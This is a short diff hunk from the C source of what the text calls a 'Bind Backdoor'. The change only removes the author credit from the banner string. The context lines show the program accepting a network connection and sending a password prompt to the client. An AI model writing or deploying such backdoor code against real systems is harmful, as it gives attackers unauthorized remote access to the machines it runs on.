@@ -86,7 +86,7 @@ int main(int argc,char **argv){
 	while((con = accept(con,0,0))==SOCKET_ERROR);
 	printf("\n[+] Connected !!!\n");
 
-	message = "[*] Bind Backdoor by MMxM\nEnter password: ";
+	message = "[*] Bind Backdoor\nEnter password: ";
 	send(con , message , strlen(message) , 0);
 
 	memset(buffer,0,1024);
